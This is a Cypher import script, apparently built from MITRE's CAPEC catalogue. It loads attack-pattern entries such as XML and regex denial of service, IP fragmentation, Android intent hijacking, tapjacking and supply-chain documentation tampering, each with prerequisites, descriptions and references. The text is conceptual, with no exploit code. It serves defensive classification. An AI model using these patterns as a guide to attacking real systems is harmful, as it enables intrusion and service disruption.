CREATE (:AttackPattern{id: 491, name: "XML Quadratic Expansion", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 358, text: "<div level=\"0\">\n  <p class=\"text\">This type of attack requires a server that accepts XML data and parses the data.</p>\n</div>"});
CREATE (:Submission{id: 434});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 428, summary: "OrderedDict([('Text', 'An adversary exploits a few properties of XML(substitution entities and inline DTDs) to cause a denial of service situation due to excessive memory being allocated to fully expand the XML. The result of this denial of service could cause the application to freeze or crash.')])"});
CREATE (:AttackPattern{id: 492, name: "Regular Expression Exponential Blowup", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 359, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the ability to identify hosts running a poorly implemented Regex, and the ability to send crafted input to exploit the regular expression.</p>\n</div>"});
CREATE (:Submission{id: 435});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 429, summary: "OrderedDict([('Text', 'An adversary may execute an attack on a program that uses a poor Regular Expression(Regex) implementation by choosing input that results in an extreme situation for the Regex. A typical extreme situation operates at exponential time compared to the input size. This is due to most implementations using a Nondeterministic Finite Automaton(NFA) state machine to be built by the Regex algorithm since NFA allows backtracking and thus more complex regular expressions. The algorithm builds a finite state machine and based on the input transitions through all the states until the end of the input is reached. NFA engines may evaluate each character in the input string multiple times during the backtracking. The algorithm tries each path through the NFA one by one until a match is found; the malicious input is crafted so every path is tried which results in a failure. Exploitation of the Regex results in programs hanging or taking a very long time to complete. These attacks may target various layers of the Internet due to regular expressions being used in validation.')])"});
CREATE (:AttackPattern{id: 493, name: "SOAP Array Blowup", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 360, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the attacker to know the endpoint of the web service, and be able to reach the endpoint with a malicious SOAP message.</p>\n</div>"});
CREATE (:Submission{id: 436});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 430, summary: "OrderedDict([('Text', 'An adversary may execute an attack on a web service that uses SOAP messages in communication. By sending a very large SOAP array declaration to the web service, the attacker forces the web service to allocate space for the array elements before they are parsed by the XML parser. The attacker message is typically small in size containing a large array declaration of say 1,000,000 elements and a couple of array elements. This attack targets exhaustion of the memory resources of the web service.')])"});
CREATE (:AttackPattern{id: 494, name: "TCP Fragmentation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 361, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send TCP packets of arbitrary size with crafted data.</p>\n</div>"});
CREATE (:Submission{id: 437});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 431, summary: "OrderedDict([('Text', 'An attacker may execute a TCP Fragmentation attack against a target with the intention of avoiding filtering rules. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. The attacker attempts to fragment the TCP packet such that the headers flag field is pushed into the second fragment which typically is not filtered. This behavior defeats some IPS and firewall filters who typically check the FLAGS in the header of the first packet since dropping this packet prevents the following fragments from being processed and assembled. Another variation is overlapping fragments thus that an innocuous first segment passes the filter and the second segment overwrites the TCP header data with the true payload which is malicious in nature. The malicious payload manipulated properly may lead to a DoS due to resource consumption or kernel crash. Additionally the fragmentation could be used in conjunction with sending fragments at a rate slightly slower than the timeout to cause a DoS condition by forcing resources that assemble the packet to wait an inordinate amount of time to complete the task. The fragmentation identification numbers could also be duplicated very easily as there are only 16 bits in IPv4 so only 65536 packets are needed.')])"});
CREATE (:AttackPattern{id: 495, name: "UDP Fragmentation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 362, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the attacker to be able to generate fragmented IP traffic containing crafted data.</p>\n</div>"});
CREATE (:Submission{id: 438});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 432, summary: "OrderedDict([('Text', 'An attacker may execute a UDP Fragmentation attack against a target server in an attempt to consume resources such as bandwidth and CPU. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. Typically the attacker will use large UDP packets over 1500 bytes of data which forces fragmentation as ethernet MTU is 1500 bytes. This attack is a variation on a typical UDP flood but it enables more network bandwidth to be consumed with fewer packets. Additionally it has the potential to consume server CPU resources and fill memory buffers associated with the processing and reassembling of fragmented packets.')])"});
CREATE (:AttackPattern{id: 496, name: "ICMP Fragmentation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 363, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send arbitrary sized ICMP packets to the target.</p>\n</div>"});
CREATE (:Submission{id: 439});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 433, summary: "OrderedDict([('Text', 'An attacker may execute a ICMP Fragmentation attack against a target with the intention of consuming resources or causing a crash. The attacker crafts a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message. The attacker these sends these messages to a target host which causes the host to become non-responsive. Another vector may be sending a fragmented ICMP message to a target host with incorrect sizes in the header which causes the host to hang.')])"});
CREATE (:AttackPattern{id: 498, name: "Probe iOS Screenshots", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 364, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires physical access to a device to either excavate the image files (potentially by leveraging a Jailbreak) or view the screenshots through the multitasking switcher (by double tapping the home button on the device).</p>\n</div>"});
CREATE (:Submission{id: 440});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 294});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Architectural_Paradigms, Related_Attack_Patterns, Technical_Context"});
CREATE (:PreviousEntryName{id: 86, name: "Probe Application Screenshots"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 434, summary: "OrderedDict([('Text', \"An adversary examines screenshot images created by iOS in an attempt to obtain sensitive information. These images are used by iOS to aid in the visual transition between open applications and improve the user's experience with a device. An application can be at risk even if it properly protects sensitive information when at rest. If the application displays sensitive information on the screen, then the potential exists for iOS to unintentionally record that information in an image file. An adversary can retrieve these images either by gaining access to the image files, or by physically obtaining the device and leveraging the multitasking switcher interface.\")])"});
CREATE (:AttackPattern{id: 499, name: "Intent Intercept", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 365, text: "<div level=\"0\">\n  <p class=\"text\">An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application is used to intercept implicit intents.</p>\n</div>"});
CREATE (:Submission{id: 441});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 435, summary: "OrderedDict([('Text', 'An adversary, through a previously installed malicious application, intercepts messages from a trusted Android-based application in an attempt to achieve a variety of different objectives including denial of service, information disclosure, and data injection. An implicit intent sent from a trusted application can be received by any application that has declared an appropriate intent filter. If the intent is not protected by a permission that the malicious application lacks, then the attacker can gain access to the data contained within the intent. Further, the intent can be either blocked from reaching the intended destination, or modified and potentially forwarded along.')])"});
CREATE (:AttackPattern{id: 5, name: "Blue Boxing", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 366, text: "<div level=\"0\">\n  <p class=\"text\">System must use weak authentication mechanisms for administrative functions.</p>\n</div>"});
CREATE (:Submission{id: 442});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 436, summary: "OrderedDict([('Text', 'This type of attack against older telephone switches and trunks has been around for decades. A tone is sent by an adversary to impersonate a supervisor signal which has the effect of rerouting or usurping command of the line. While the US infrastructure proper may not contain widespread vulnerabilities to this type of attack, many companies are connected globally through call centers and business process outsourcing. These international systems may be operated in countries which have not upgraded Telco infrastructure and so are vulnerable to Blue boxing. Blue boxing is a result of failure on the part of the system to enforce strong authorization for administrative functions. While the infrastructure is different than standard current applications like web applications, there are historical lessons to be learned to upgrade the access control for administrative functions.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.5.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 264});
CREATE (:ResourcesRequired{id: 229, text: "<div level=\"0\">\n  <p class=\"text\">CCITT-5 or other vulnerable lines, with the ability to send tones such as combined 2,400 Hz and 2,600 Hz tones to the switch</p>\n</div>"});
CREATE (:AttackPattern{id: 50, name: "Password Recovery Exploitation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 367, text: "<div level=\"0\">\n  <p class=\"text\">The system allows users to recover their passwords and gain access back into the system.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 368, text: "<div level=\"0\">\n  <p class=\"text\">Password recovery mechanism has been designed or implemented insecurely.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 369, text: "<div level=\"0\">\n  <p class=\"text\">Password recovery mechanism relies only on something the user knows and not something the user has.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 370, text: "<div level=\"0\">\n  <p class=\"text\">No third party intervention is required to use the password recovery mechanism.</p>\n</div>"});
CREATE (:Submission{id: 443});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 437, summary: "OrderedDict([('Text', [\"An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure. Most of them use only one security question . For instance, mother's maiden name tends to be a fairly popular one. Unfortunately in many cases this information is not very hard to find, especially if the attacker knows the legitimate user.\", 'These generic security questions are also re-used across many applications, thus making them even more insecure. An attacker could for instance overhear a coworker talking to a bank representative at the work place and supplying their mother\\'s maiden name for verification purposes. An attacker can then try to log in into one of the victim\\'s accounts, click on \"forgot password\" and there is a good chance that the security question there will be to provide mother\\'s maiden name.', 'A weak password recovery scheme totally undermines the effectiveness of a strong password scheme.'])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Understand the password recovery mechanism and how it works.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Find a weakness in the password recovery mechanism and exploit it. For instance, a weakness may be that a standard single security question is used with an easy to determine answer.</p>\n</div>"});
MERGE (:Reference{local_id: "R.50.1", title: "Advisory: Unauthorized password recovery in phpBannerExchange", publisher: "RedTeam Pentesting GmbH", pubdate: "2006", link: "http://www.redteam-pentesting.de/advisories/rt-sa-2006-005.txt"});
MERGE (:CWE{id: 522});
MERGE (:CWE{id: 640});
MERGE (:CWE{id: 718});
CREATE (:ResourcesRequired{id: 230, text: "<div level=\"0\">\n  <p class=\"text\">For a brute force attack one would need a machine with sufficient CPU, RAM and HD.</p>\n</div>"});
CREATE (:AttackPattern{id: 500, name: "WebView Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 371, text: "<div level=\"0\">\n  <p class=\"text\">An adversary must be able install a purpose built malicious application onto the device and convince the user to execute it. The malicious application is designed to target a specific web application and is used to load the target web pages via the WebView component. For example, an adversary may develop an application that interacts with Facebook via WebView and adds a new feature that a user desires. The user would install this 3rd party app instead of the Facebook app.</p>\n</div>"});
CREATE (:Submission{id: 444});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 438, summary: "OrderedDict([('Text', 'An adversary, through a previously installed malicious application, injects code into the context of a web page displayed by a WebView component. Through the injected code, an adversary is able to manipulate the DOM tree and cookies of the page, expose sensitive information, and can launch attacks against the web application from within the web page.')])"});
CREATE (:AttackPattern{id: 501, name: "Activity Hijack", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 445});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 439, summary: "OrderedDict([('Text', \"An adversary, through a previously installed malicious application, intercepts an implicit intent sent to launch a trusted activity and instead launches a counterfeit activity in its place. The malicious activity is then used to mimic the trusted activity's user interface and convince the user to enter sensitive data as if they were interacting with the trusted activity.\")])"});
CREATE (:AttackPattern{id: 502, name: "Intent Spoof", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 372, text: "<div level=\"0\">\n  <p class=\"text\">An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application will be used to issue spoofed intents.</p>\n</div>"});
CREATE (:Submission{id: 446});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 440, summary: "OrderedDict([('Text', \"An adversary, through a previously installed malicious application, issues an intent directed toward a specific trusted application's component in an attempt to achieve a variety of different objectives including modification of data, information disclosure, and data injection. Components that have been unintentionally exported and made public are subject to this type of an attack. If the component blindly trusts the intent's action, then the target application performs the functionality at the adversary's request, helping the adversary achieve the desired negative technical impact.\")])"});
CREATE (:AttackPattern{id: 503, name: "WebView Exposure", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 373, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the adversary to convince the user to load the malicious web page inside the target application. Once loaded, the malicious web page will have the same permissions as the target application and will have access to all registered interfaces. Both the permission and the interface must be in place for the functionality to be exposed.</p>\n</div>"});
CREATE (:Submission{id: 447});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 441, summary: "OrderedDict([('Text', \"An adversary, through a malicious web page, accesses application specific functionality by leveraging interfaces registered through WebView's addJavascriptInterface API. Once an interface is registered to WebView through addJavascriptInterface, it becomes global and all pages loaded in the WebView can call this interface.\")])"});
CREATE (:AttackPattern{id: 504, name: "Task Impersonation", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 448});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 442, summary: "OrderedDict([('Text', \"An adversary, through a previously installed malicious application, monitors the task list maintained by the operating system and waits for a specific legitimate task to become active. Once the task is detected, the malicious application launches a new task in the foreground that mimics the user interface of the legitimate task. At this point, the user thinks that they are interacting with the legitimate task that they started, but instead they are interacting with the malicious application. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user. Once the adversary's goal is reached, the malicious application can exit, leaving the original trusted application visible and the appearance that nothing out of the ordinary has occurred.\")])"});
CREATE (:AttackPattern{id: 505, name: "Scheme Squatting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 449});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 443, summary: "OrderedDict([('Text', 'An adversary, through a previously installed malicious application, registers for a URL scheme intended for a target application that has not been installed. Thereafter, messages intended for the target application are handled by the malicious application. Upon receiving a message, the malicious application displays a screen that mimics the target application, thereby convincing the user to enter sensitive information. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user as they think that they are interacting with the intended target application.')])"});
CREATE (:AttackPattern{id: 506, name: "Tapjacking", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 374, text: "<div level=\"0\">\n  <p class=\"text\">This pattern of attack requires the ability to execute a malicious application on the user's device. This malicious application is used to present the interface to the user and make the attack possible.</p>\n</div>"});
CREATE (:Submission{id: 450});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 295});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:Description{id: 444, summary: "OrderedDict([('Text', 'An adversary, through a previously installed malicious application, displays an interface that misleads the user and convinces him/her to tap in an attacker desired location on the screen. This is often accomplished by overlaying one screen on top of another while giving the appearance of a single interface. There are two main techniques used to accomplish this. The first is to leverage transparent properties that allow taps on the screen to pass through the visible application to an application running in the background. The second is to strategically place a small object (e.g., a button or text field) on top of the visible screen and make it appear to be a part of the underlying application. In both cases, the user is convinced to tap on the screen but does not realize the application that they are interacting with.')])"});
CREATE (:AttackPattern{id: 507, name: "Physical Theft", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 375, text: "<div level=\"0\">\n  <p class=\"text\">This type of attack requires the existence of a physical target that an adversary believes hosts something of value.</p>\n</div>"});
CREATE (:Submission{id: 451});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 445, summary: "OrderedDict([('Text', 'An adversary gains physical access to a system or device through theft of the item. Possession of a system or device enables a number of unique attacks to be executed and often provides the adversary with an extended timeframe for which to perform an attack. Most protections put in place to secure sensitive information can be defeated when an adversary has physical access and enough time.')])"});
CREATE (:AttackPattern{id: 51, name: "Poison Web Service Registry", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 376, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to write to resources or redirect access to the service registry.</p>\n</div>"});
CREATE (:Submission{id: 452});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 446, summary: "OrderedDict([('Text', ['SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata (to effect a denial of service), and delete information about service provider interfaces.', 'WS-Addressing is used to virtualize services, provide return addresses and other routing information, however, unless the WS-Addressing headers are protected they are vulnerable to rewriting. The attacker that can rewrite WS-addressing information gains the ability to route service requesters to any service providers, and the ability to route service provider response to any service.', 'Content in a registry is deployed by the service provider. The registry in an SOA or Web Services system can be accessed by the service requester via UDDI or other protocol. The basic flow for the attacker consists of either altering the data at rest in the registry or uploading malicious content by spoofing a service provider. The service requester is then redirected to send its requests and/or responses to services the attacker controls.'])])"});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 693});
CREATE (:ResourcesRequired{id: 231, text: "<div level=\"0\">\n  <p class=\"text\">Capability to directly or indirectly modify registry resources</p>\n</div>"});
CREATE (:AttackPattern{id: 510, name: "SaaS User Request Forgery", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 377, text: "<div level=\"0\">\n  <p class=\"text\">An adversary must be able install a purpose built malicious application onto the trusted user's system and convince the user to execute it while authenticated to the SaaS application.</p>\n</div>"});
CREATE (:Submission{id: 453});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 447, summary: "OrderedDict([('Text', 'An adversary, through a previously installed malicious application, performs malicious actions against a third-party Software as a Service (SaaS) application (also known as a cloud based application) by leveraging the persistent and implicit trust placed on a trusted user\\'s session. This attack is executed after a trusted user is authenticated into a cloud service, \"piggy-backing\" on the authenticated session, and exploiting the fact that the cloud service believes it is only interacting with the trusted user. If successful, the actions embedded in the malicious application will be processed and accepted by the targeted SaaS application and executed at the trusted user\\'s privilege level.')])"});
MERGE (:Reference{id: "REF-45", local_id: "R.510.1", author: "Ami Luttwak", title: "A new Zeus variant targeting Salesforce.com – Research and Analysis", publisher: "Adallom, Inc.", link: "http://www.adallom.com/blog/a-new-zeus-variant-targeting-salesforce-com-accounts-research-and-analysis/"});
MERGE (:CWE{id: 346});
CREATE (:AttackPattern{id: 511, name: "Infiltration of Software Development Environment", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 378, text: "<div level=\"0\">\n  <p class=\"text\">The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 379, text: "<div level=\"0\">\n  <p class=\"text\">The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 380, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.</p>\n</div>"});
CREATE (:Submission{id: 454});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 296});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 448, summary: "OrderedDict([('Text', \"An attacker uses common delivery mechanisms such as email attachments or removable media to infiltrate the IDE (Integrated Development Environment) of a victim manufacturer with the intent of implanting malware allowing for attack control of the victim IDE environment. The attack then uses this access to exfiltrate sensitive data or information, manipulate said data or information, and conceal these actions. This will allow and aid the attack to meet the goal of future compromise of a recipient of the victim's manufactured product further down in the supply chain.\")])"});
MERGE (:Reference{id: "REF-50", local_id: "R.511.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 516, name: "Hardware Component Substitution During Baselining", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 381, text: "<div level=\"0\">\n  <p class=\"text\">The attacker will need either physical access or be able to supply malicious hardware components to the product development facility.</p>\n</div>"});
CREATE (:Submission{id: 455});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 297});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Examples-Instances, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 449, summary: "OrderedDict([('Text', 'An attacker with access to system components during allocated baseline development can substitute a maliciously altered hardware component for a baseline component in the during the product development and research phase. This can lead to adjustments and calibrations being made in the product, so that when the final product with the proper components is deployed, it will not perform as designed and be advantageous to the attacker.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.516.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 517, name: "Documentation Alteration to Circumvent Dial-down", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 382, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge of internal software and hardware components within manufacturer's development environment.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 383, text: "<div level=\"0\">\n  <p class=\"text\">Access to the manufacturer's documentation.</p>\n</div>"});
CREATE (:Submission{id: 456});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 298});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 450, summary: "OrderedDict([('Text', \"An attacker with access to a manufacturer's documentation, which include descriptions of advanced technology and/or specific components' criticality, alters the documents to circumvent dial-down functionality requirements. This alteration would change the interpretation of implementation and manufacturing techniques, allowing for advanced technologies to remain in place even though these technologies might be restricted to certain customers, such as nations on the terrorist watch list, giving the attacker on the receiving end of a shipped product access to an advanced technology that might otherwise be restricted.\")])"});
MERGE (:Reference{id: "REF-50", local_id: "R.517.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 518, name: "Documentation Alteration to Produce Under-performing Systems", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 384, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge of software and hardware capabilities of a manufacturer's product.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 385, text: "<div level=\"0\">\n  <p class=\"text\">Access to the manufacturer's documentation.</p>\n</div>"});
CREATE (:Submission{id: 457});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 299});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 451, summary: "OrderedDict([('Text', \"An attacker with access to a manufacturer's documentation alters the descriptions of system capabilities with the intent of causing errors in derived system requirements, impacting the overall effectiveness and capability of the system, allowing an attacker to take advantage of the introduced system capability flaw once the system is deployed.\")])"});
MERGE (:Reference{id: "REF-50", local_id: "R.518.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 519, name: "Documentation Alteration to Cause Errors in System Design", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 386, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge of software capabilities of a manufacturer's product.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 387, text: "<div level=\"0\">\n  <p class=\"text\">Access to the manufacturer's documentation.</p>\n</div>"});
CREATE (:Submission{id: 458});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 300});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 452, summary: "OrderedDict([('Text', \"An attacker with access to a manufacturer's documentation containing requirements allocation and software design processes maliciously alters the documentation in order to cause errors in system design. This allows the attacker to take advantage of a weakness in a deployed system of the manufacturer for malicious purposes.\")])"});
MERGE (:Reference{id: "REF-50", local_id: "R.519.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 52, name: "Embedding NULL Bytes", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 388, text: "<div level=\"0\">\n  <p class=\"text\">The program does not properly handle postfix NULL terminators</p>\n</div>"});
CREATE (:Submission{id: 459});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 453, summary: "OrderedDict([('Text', 'An attacker embeds one or more null bytes in input to the target software. This attack relies on the usage of a null-valued byte as a string terminator in many environments. The goal is for certain components of the target software to stop processing the input when it encounters the null byte(s).')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Identify a place in the program where user input may be used to escalate privileges by for instance accessing unauthorized file system resources through directory browsing.</p>\n</div>"});
